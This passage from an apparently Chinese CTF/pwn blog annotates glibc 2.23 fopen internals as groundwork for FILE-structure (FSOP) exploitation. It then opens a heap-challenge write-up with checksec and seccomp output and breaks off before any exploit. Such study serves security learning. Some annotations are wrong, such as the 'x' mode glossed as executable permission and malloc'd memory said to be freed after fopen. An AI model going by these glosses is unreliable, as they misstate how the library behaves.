class="meta-keyword">define</span> _IO_new_fopen fopen</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">_IO_FILE *</span><br><span class="line">_IO_new_fopen (filename, mode)</span><br><span class="line">     <span class="keyword">const</span> <span class="keyword">char</span> *filename;</span><br><span class="line">     <span class="keyword">const</span> <span class="keyword">char</span> *mode;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">locked_FILE</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">fp</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> <span class="title">wd</span>;</span></span><br><span class="line">  &#125; *new_f = (struct locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (struct locked_FILE));</span><br><span class="line"><span class="comment">/* malloc分配内存空间 */</span></span><br><span class="line">  <span class="keyword">if</span> (new_f == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">/* _IO_no_init对file结构体进行初始化 */</span></span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">1</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps; <span class="comment">/* 设置_IO_file_jumps函数表 */</span></span><br><span class="line">  _IO_file_init (&amp;new_f-&gt;fp); <span class="comment">/* _IO_file_init将结构体链接进_IO_list_all链表 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span>  !_IO_UNIFIED_JUMPTABLES</span></span><br><span class="line">  new_f-&gt;fp.vtable = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, <span class="number">1</span>) != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> (_IO_FILE *) &amp;new_f-&gt;fp; <span class="comment">/* 执行系统调用打开文件 */</span></span><br><span class="line">  _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="built_in">free</span> (new_f);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC</span></span><br><span class="line">strong_alias (_IO_new_fopen, __new_fopen)</span><br><span class="line">versioned_symbol (libc, _IO_new_fopen, _IO_fopen, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, __new_fopen, fopen, GLIBC_2_1);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>fopen 实际上是 <code>_IO_new_fopen</code> 函数，前面都是一些初始化的操作：</p>
<ul>
<li><code>malloc</code>分配内存空间</li>
<li><code>_IO_no_init</code> 对FILE结构体进行 <code>null</code> 初始化</li>
<li><code>_IO_file_init</code> 将结构体链接进 <code>_IO_list_all</code> 链表</li>
<li><code>_IO_file_fopen</code> 执行系统调用打开文件</li>
</ul>
<p>接下来便分别对它们进行分析：</p>
<p><strong>malloc 分配内存空间</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*new_f = (struct locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (struct locked_FILE));</span><br></pre></td></tr></table></figure>
<p>这个“locked_FILE”是个结构体（就是FILE结构体），包含了3个条目：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">locked_FILE</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">fp</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> <span class="title">wd</span>;</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>malloc 将会分配“locked_FILE”结构体大小的内存，最后在”fopen“执行完成后释放掉</p>
<p><strong>_IO_no_init 对FILE结构体进行 null 初始化</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_no_init (fp, flags, orientation, wd, jmp)</span><br><span class="line">     _IO_FILE *fp;</span><br><span class="line">     <span class="keyword">int</span> flags;</span><br><span class="line">     <span class="keyword">int</span> orientation;</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *<span class="title">wd</span>;</span></span><br><span class="line">     <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">jmp</span>;</span></span><br><span class="line">&#123;</span><br><span class="line">  fp-&gt;_flags = _IO_MAGIC|flags;</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_chain = <span class="literal">NULL</span>; <span class="comment">/* Not necessary. */</span></span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_markers = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_cur_column = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> _IO_JUMPS_OFFSET</span></span><br><span class="line">  fp-&gt;_vtable_offset = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_init (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  fp-&gt;_mode = orientation;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="keyword">if</span> (orientation &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_wide_data = wd; <span class="comment">/* 初始化fp的_wide_data字段 */</span></span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_wide_vtable = jmp;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对 _IO_FILE_plus 里面的条目进行置空操作，对 _IO_wide_data 进行赋值并置空</p>
<p><strong>_IO_file_init 将结构体链接进 _IO_list_all 链表</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> _IO_new_file_init _IO_file_init</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_new_file_init (fp)</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *<span class="title">fp</span>;</span></span><br><span class="line">&#123;</span><br><span class="line">  fp-&gt;file._offset = _IO_pos_BAD;</span><br><span class="line">  fp-&gt;file._IO_file_flags |= CLOSED_FILEBUF_FLAGS;</span><br><span class="line"></span><br><span class="line">  _IO_link_in (fp);</span><br><span class="line">  fp-&gt;file._fileno = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数完成了一些设置（暂时不用管）调用了 _IO_link_in </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_link_in (fp)</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *<span class="title">fp</span>;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="number">0</span>) </span><br><span class="line">        <span class="comment">/* 检查FILE结构体是否包含_IO_LINKED标志 */</span></span><br><span class="line">      &#123;</span><br><span class="line">	fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">	_IO_lock_lock (list_all_lock); <span class="comment">/* 加锁 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</span><br><span class="line">	_IO_list_all = fp;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">	_IO_lock_unlock (list_all_lock); <span class="comment">/* 解锁 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 <code>_chain</code> 字段（指向FILE链表的下一个单元）写入 <code>_IO_list_all</code> ，然后在 <code>_IO_list_all</code> 写入 fp ，此时 fp 成为了FILE链表的头部（全局变量 <code>_IO_list_all</code> 永远指向了FILE链表的头部 ）</p>
<p>​        // 标准的插头法，和 fastbin，smallbin，unsortedbin 差不多</p>
<p><strong>_IO_file_fopen 打开文件句柄</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> _IO_new_file_fopen _IO_file_fopen</span></span><br><span class="line"></span><br><span class="line">_IO_FILE *</span><br><span class="line">_IO_new_file_fopen (fp, filename, mode, is32not64)</span><br><span class="line">     _IO_FILE *fp;</span><br><span class="line">     <span class="keyword">const</span> <span class="keyword">char</span> *filename;</span><br><span class="line">     <span class="keyword">const</span> <span class="keyword">char</span> *mode;</span><br><span class="line">     <span class="keyword">int</span> is32not64;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> oflags = <span class="number">0</span>, omode;</span><br><span class="line">  <span class="keyword">int</span> read_write;</span><br><span class="line">  <span class="keyword">int</span> oprot = <span class="number">0666</span>;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  _IO_FILE *result;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> _LIBC</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *cs;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (_IO_file_is_open (fp)) <span class="comment">/* 检查文件描述符是否打开 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">switch</span> (*mode) <span class="comment">/* 设置文件打开的模式(权限&amp;类型) */</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">      omode = O_RDONLY; <span class="comment">/* 只读 */</span></span><br><span class="line">      read_write = _IO_NO_WRITES;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">      omode = O_WRONLY; <span class="comment">/* 只写 */</span></span><br><span class="line">      oflags = O_CREAT|O_TRUNC;</span><br><span class="line">      read_write = _IO_NO_READS;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">      omode = O_WRONLY; <span class="comment">/* 只写 */</span></span><br><span class="line">      oflags = O_CREAT|O_APPEND;</span><br><span class="line">      read_write = _IO_NO_READS|_IO_IS_APPENDING;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      __set_errno (EINVAL); <span class="comment">/* 设置错误代码 */</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> (*++mode) <span class="comment">/* 设置文件打开的模式(附加) */</span></span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;\0&#x27;</span>: <span class="comment">/* 无附加 */</span></span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>: <span class="comment">/* 附加读&amp;写权限 */</span></span><br><span class="line">	  omode = O_RDWR;</span><br><span class="line">	  read_write &amp;= _IO_IS_APPENDING;</span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>: <span class="comment">/* 附加可执行权限 */</span></span><br><span class="line">	  oflags |= O_EXCL;</span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>: <span class="comment">/* 以二进制的形式进行读写 */</span></span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  result = _IO_file_open (fp, filename, omode|oflags, oprot, read_write,</span><br><span class="line">			  is32not64); </span><br><span class="line">    <span class="comment">/* 调用_IO_file_open系统调用进行文件读取,后面的操作就不用管了 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> _LIBC</span></span><br><span class="line">  <span class="comment">/* Test whether the mode string specifies the conversion.  */</span></span><br><span class="line">  cs = <span class="built_in">strstr</span> (mode, <span class="string">&quot;,ccs=&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (cs != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Yep.  Load the appropriate conversions and set the orientation</span></span><br><span class="line"><span class="comment">	 to wide.  */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">gconv_fcts</span> <span class="title">fcts</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (! _IO_CHECK_WIDE (fp) || __wcsmbs_named_conv (&amp;fcts, cs + <span class="number">5</span>) != <span class="number">0</span>)</span><br><span class="line">	  &#123;</span><br><span class="line">	    <span class="comment">/* Something went wrong, we cannot load the conversion modules.</span></span><br><span class="line"><span class="comment">	       This means we cannot proceed since the user explicitly asked</span></span><br><span class="line"><span class="comment">	       for these.  */</span></span><br><span class="line">	    _IO_new_fclose (result);</span><br><span class="line">	    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	cc = fp-&gt;_codecvt = &amp;fp-&gt;_wide_data-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* The functions are always the same.  */</span></span><br><span class="line">	*cc = __libio_codecvt;</span><br><span class="line"></span><br><span class="line">	cc-&gt;__cd_in.__cd.__nsteps = <span class="number">1</span>; <span class="comment">/* Only one step allowed.  */</span></span><br><span class="line">	cc-&gt;__cd_in.__cd.__steps = fcts.towc;</span><br><span class="line"></span><br><span class="line">	cc-&gt;__cd_in.__cd.__data[<span class="number">0</span>].__invocation_counter = <span class="number">0</span>;</span><br><span class="line">	cc-&gt;__cd_in.__cd.__data[<span class="number">0</span>].__internal_use = <span class="number">1</span>;</span><br><span class="line">	cc-&gt;__cd_in.__cd.__data[<span class="number">0</span>].__flags = __GCONV_IS_LAST;</span><br><span class="line">	cc-&gt;__cd_in.__cd.__data[<span class="number">0</span>].__statep = &amp;result-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line"></span><br><span class="line">	cc-&gt;__cd_out.__cd.__nsteps = <span class="number">1</span>; <span class="comment">/* Only one step allowed.  */</span></span><br><span class="line">	cc-&gt;__cd_out.__cd.__steps = fcts.tomb;</span><br><span class="line"></span><br><span class="line">	cc-&gt;__cd_out.__cd.__data[<span class="number">0</span>].__invocation_counter = <span class="number">0</span>;</span><br><span class="line">	cc-&gt;__cd_out.__cd.__data[<span class="number">0</span>].__internal_use = <span class="number">1</span>;</span><br><span class="line">	cc-&gt;__cd_out.__cd.__data[<span class="number">0</span>].__flags = __GCONV_IS_LAST;</span><br><span class="line">	cc-&gt;__cd_out.__cd.__data[<span class="number">0</span>].__statep = &amp;result-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Set the mode now.  */</span></span><br><span class="line">	result-&gt;_mode = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>	<span class="comment">/* GNU libc */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序会先检查文件描述符是否打开，然后在 Switch-Case 里面设置文件打开的模式 </p>
<hr>
<p>fopen 只是开胃菜，还没有什么漏洞，接下来的 fread 就是重点了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/29/FSOP+Unsortedbin%20attack+%E5%A0%86%E4%B8%8AORW/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/29/FSOP+Unsortedbin%20attack+%E5%A0%86%E4%B8%8AORW/" class="post-title-link" itemprop="url">FSOP+Unsortedbin attack+堆上ORW</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-29 14:33:12" itemprop="dateCreated datePublished" datetime="2022-03-29T14:33:12+08:00">2022-03-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-05-24 01:03:57" itemprop="dateModified" datetime="2022-05-24T01:03:57+08:00">2022-05-24</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>17k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>15 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>x_heap</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 ./chall                                  </span><br><span class="line"><span class="number">1.</span>add</span><br><span class="line"><span class="number">2.</span><span class="keyword">delete</span></span><br><span class="line"><span class="number">3.</span>edit</span><br><span class="line"><span class="number">4.</span>show</span><br><span class="line">&gt; </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> chall: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=a9ca4e5f4f591a5343f4c0d406006bde41b14d38, stripped                             </span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/chall&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>64位，dynamically，全开</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.23</span><span class="number">-0u</span>buntu11)</span> stable release versio</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 seccomp-tools dump ./chall </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span 